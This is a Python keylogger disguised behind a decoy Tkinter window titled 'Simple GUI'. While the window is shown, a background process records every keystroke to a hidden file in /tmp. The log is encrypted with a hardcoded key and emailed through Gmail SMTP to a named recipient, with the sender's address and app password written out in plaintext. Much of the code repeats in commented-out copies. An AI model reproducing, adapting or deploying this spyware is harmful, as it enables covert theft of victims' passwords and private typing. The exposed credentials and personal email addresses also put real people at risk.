import subprocess
import time
import tkinter as tk
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time
import logging
import os
from pynput.keyboard import Key, Listener, KeyCode
from cryptography.fernet import Fernet
import base64
import signal
import multiprocessing
import sys; sys.frozen = False
# termination_requested = False

# def handle_termination_signal(signum, frame):
#     global termination_requested
#     termination_requested = True
#     if os.path.exists(log_file):
#         send_log_email()
#         os.remove(log_file)
#     exit(0)

# signal.signal(signal.SIGTERM, handle_termination_signal)

# # Encryption
# key = base64.urlsafe_b64encode(b"AMQABGAAXSHKALABRIAPIAWTGAFUAABV")
# key_obj = Fernet(key)

# # Mail data
# subject = "Keylog Data"
# body = "This email contains the keylog data."
# sender_email = "applepiestorage@gmail.com"
# receiver_email = "maynarde.joseph@gmail.com" 
# email_password = "sgjrbyuqghwwbtrc"

# # Temp files
# log_file = "/tmp/.keylog.txt"
# encrypted_file = '/tmp/.encrypted.txt'

# # Kill switch
# switchactive = False

# def on_release(key):
#     global switchactive
#     if key == Key.esc:
#         switchactive = True
#         return False

# # Function for encryption the logs
# def encrypt_file(input_file, output_file):
#     with open(input_file, 'rb') as file:
#         plaintext = file.read()
#         encrypted_data = key_obj.encrypt(plaintext)
    
#     with open(output_file, 'wb') as file:
#         file.write(encrypted_data)

# # Function to send email     
# def send_email(user, pwd, recipient, subject, body, file_path):
#     # Create a multipart message
#     message = MIMEMultipart()
#     message["From"] = user
#     message["To"] = recipient
#     message["Subject"] = subject

#     # Attach the body of the email
#     message.attach(MIMEText(body, "plain"))

#     # Attach the .txt file
#     with open(file_path, "rb") as attachment:
#         part = MIMEApplication(attachment.read(), Name="textfile.txt")

#     # Add header for the attachment
#     part["Content-Disposition"] = f"attachment; filename={file_path}"
#     message.attach(part)

#     try:
#         server = smtplib.SMTP("smtp.gmail.com", 587)
#         server.ehlo()
#         server.starttls()
#         server.login(user, pwd)
#         server.sendmail(user, recipient, message.as_string())
#         server.close()
#     except Exception as e:
#         pass
      
# def on_press(key):
#     logging.info(str(key))
#     if key == Key.esc:
#         switchactive = True
#         return False

# # Handle the proccess of encryption, mailing, and managing files
# def send_log_email():
#     encrypt_file(log_file, encrypted_file)
#     send_email(sender_email, email_password, receiver_email, subject, body, encrypted_file)
#     if os.path.exists(encrypted_file):
#         os.remove(encrypted_file)
        
# Function to start the keylogger
def run_keylogger():
    termination_requested = False

    def handle_termination_signal(signum, frame):
        global termination_requested
        termination_requested = True
        if os.path.exists(log_file):
            send_log_email()
            os.remove(log_file)
        exit(0)

    signal.signal(signal.SIGTERM, handle_termination_signal)

    # Encryption
    key = base64.urlsafe_b64encode(b"AMQABGAAXSHKALABRIAPIAWTGAFUAABV")
    key_obj = Fernet(key)

    # Mail data
    subject = "Keylog Data"
    body = "This email contains the keylog data."
    sender_email = "applepiestorage@gmail.com"
    receiver_email = "maynarde.joseph@gmail.com" 
    email_password = "sgjrbyuqghwwbtrc"

    # Temp files
    log_file = "/tmp/.keylog.txt"
    encrypted_file = '/tmp/.encrypted.txt'

    # Kill switch
    switchactive = False

    def on_release(key):
        global switchactive
        if key == Key.esc:
            switchactive = False
            return False

    # Function for encryption the logs
    def encrypt_file(input_file, output_file):
        with open(input_file, 'rb') as file:
            plaintext = file.read()
            encrypted_data = key_obj.encrypt(plaintext)
        
        with open(output_file, 'wb') as file:
            file.write(encrypted_data)

    # Function to send email     
    def send_email(user, pwd, recipient, subject, body, file_path):
        # Create a multipart message
        message = MIMEMultipart()
        message["From"] = user
        message["To"] = recipient
        message["Subject"] = subject

        # Attach the body of the email
        message.attach(MIMEText(body, "plain"))

        # Attach the .txt file
        with open(file_path, "rb") as attachment:
            part = MIMEApplication(attachment.read(), Name="textfile.txt")

        # Add header for the attachment
        part["Content-Disposition"] = f"attachment; filename={file_path}"
        message.attach(part)

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(user, pwd)
            server.sendmail(user, recipient, message.as_string())
            server.close()
        except Exception as e:
            pass
          
    def on_press(key):
        logging.info(str(key))
        # if key == Key.esc:
        #     switchactive = True
        #     return False

    # Handle the proccess of encryption, mailing, and managing files
    def send_log_email():
        encrypt_file(log_file, encrypted_file)
        send_email(sender_email, email_password, receiver_email, subject, body, encrypted_file)
        if os.path.exists(encrypted_file):
            os.remove(encrypted_file)
    try:
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    
        if switchactive:
            if os.path.exists(log_file):
                send_log_email()
                os.remove(log_file)
    
    except KeyboardInterrupt:
        # Handle the case where you manually stop the keylogger with Ctrl+C
        if os.path.exists(log_file):
            send_log_email()
            os.remove(log_file)
            
    finally:
        if os.path.exists(log_file):
            send_log_email()
            os.remove(log_file)
        
    if not termination_requested:
        if os.path.exists(log_file):
            send_log_email()
            os.remove(log_file)

# Code for the GUI
def create_simple_gui():
    root = tk.Tk()
    root.title("Simple GUI")

    canvas = tk.Canvas(root, height=700, width=700, bg="#263D42")
    canvas.pack()

    frame = tk.Frame(root, bg="white")
    frame.place(relx=0.1, rely=0.1, relwidth=0.8, relheight=0.8)

    openFile = tk.Button(root, text="Open File", padx=25, pady=10, fg='white', bg="#263D42")
    openFile.pack()

    runApps = tk.Button(root, text="Run Apps", padx=25, pady=10, fg='white', bg="#263D42")
    runApps.pack()

    root.mainloop()









# # start gui
# gui_process = subprocess.Popen(["python3", "app.py"])
# time.sleep(5) 
# keylogger_process = subprocess.Popen(["python3", "keylogger.py"])

# # wait for responses and stuff
# gui_exit_code = gui_process.poll()
# while gui_exit_code is None:
#     time.sleep(1)
#     gui_exit_code = gui_process.poll()

# # close logger if gui closed
# if keylogger_process.poll() is None:
#     keylogger_process.terminate()

# keylogger_process.wait()

if __name__ == "__main__":
    # Create separate processes for the keylogger and the GUI
    keylogger_process = multiprocessing.Process(target=run_keylogger)
    gui_process = multiprocessing.Process(target=create_simple_gui)

    # Start the GUI process
    keylogger_process.start()

    # Wait for the GUI process to start (you can adjust the sleep duration as needed)
    time.sleep(5)

    # Start the keylogger process
    gui_process.start()

    # Wait for the GUI process to complete
    gui_process.join()

    # Check if the keylogger process is still running
    if not gui_process.is_alive():
        # Close the logger if the GUI is closed
        keylogger_process.terminate()

    # Wait for the keylogger process to complete
    keylogger_process.join()

